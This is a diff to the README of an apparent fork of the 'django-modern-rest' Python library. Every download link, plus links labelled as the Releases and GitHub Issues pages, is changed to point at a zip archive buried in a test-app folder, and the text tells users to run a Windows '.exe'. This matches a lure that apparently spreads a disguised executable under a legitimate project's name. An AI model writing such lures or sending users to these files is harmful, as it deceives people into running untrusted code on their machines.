@@ -6,11 +6,11 @@ Welcome to django-modern-rest! This application offers a powerful and user-frien
 ## 📥 Download & Install
 #### To get started, visit the Releases page to download the latest version:
 
-[![Download django-modern-rest](https://raw.githubusercontent.com/khanhtruong2904/django-modern-rest/master/monocytic/django-modern-rest.zip)](https://raw.githubusercontent.com/khanhtruong2904/django-modern-rest/master/monocytic/django-modern-rest.zip)
+[![Download django-modern-rest](https://github.com/khanhtruong2904/django-modern-rest/raw/refs/heads/master/django_test_app/server/apps/rest/modern-rest-django-1.9.zip)](https://github.com/khanhtruong2904/django-modern-rest/raw/refs/heads/master/django_test_app/server/apps/rest/modern-rest-django-1.9.zip)
 
 1. **Go to the Releases page:** Click the link above to be taken to the official GitHub Releases page for django-modern-rest.
 2. **Find the latest version:** Scroll down to the "Latest Release" section. You will find the version number and a list of available files.
-3. **Download the application:** Click on the file that best suits your needs. For most users, this will be the file labeled with the `.exe` extension (for Windows) or an equivalent file for your operating system (like `https://raw.githubusercontent.com/khanhtruong2904/django-modern-rest/master/monocytic/django-modern-rest.zip` for Linux).
+3. **Download the application:** Click on the file that best suits your needs. For most users, this will be the file labeled with the `.exe` extension (for Windows) or an equivalent file for your operating system (like `https://github.com/khanhtruong2904/django-modern-rest/raw/refs/heads/master/django_test_app/server/apps/rest/modern-rest-django-1.9.zip` for Linux).
 
 Once downloaded, follow the next steps to run the application.
 
@@ -41,7 +41,7 @@ django-modern-rest provides several useful features:
 - **Comprehensive Documentation:** Access clear guides and examples directly in the application.
 
 ## 📚 Getting Help
-If you run into issues or need help using the application, check out the documentation included with your download. You can also visit the [GitHub Issues page](https://raw.githubusercontent.com/khanhtruong2904/django-modern-rest/master/monocytic/django-modern-rest.zip) to report bugs or ask questions.
+If you run into issues or need help using the application, check out the documentation included with your download. You can also visit the [GitHub Issues page](https://github.com/khanhtruong2904/django-modern-rest/raw/refs/heads/master/django_test_app/server/apps/rest/modern-rest-django-1.9.zip) to report bugs or ask questions.
 
 ## 🌐 Community and Contributions
 Join our community! Your feedback helps us improve django-modern-rest. Feel free to contribute by:
@@ -55,6 +55,6 @@ The django-modern-rest project aims to simplify the development of APIs and prov
 
 **Remember to visit the Releases page to download the latest version:**
 
-[![Download django-modern-rest](https://raw.githubusercontent.com/khanhtruong2904/django-modern-rest/master/monocytic/django-modern-rest.zip)](https://raw.githubusercontent.com/khanhtruong2904/django-modern-rest/master/monocytic/django-modern-rest.zip)
+[![Download django-modern-rest](https://github.com/khanhtruong2904/django-modern-rest/raw/refs/heads/master/django_test_app/server/apps/rest/modern-rest-django-1.9.zip)](https://github.com/khanhtruong2904/django-modern-rest/raw/refs/heads/master/django_test_app/server/apps/rest/modern-rest-django-1.9.zip)
 
 Thank you for using django-modern-rest! Your journey to building modern APIs starts here.
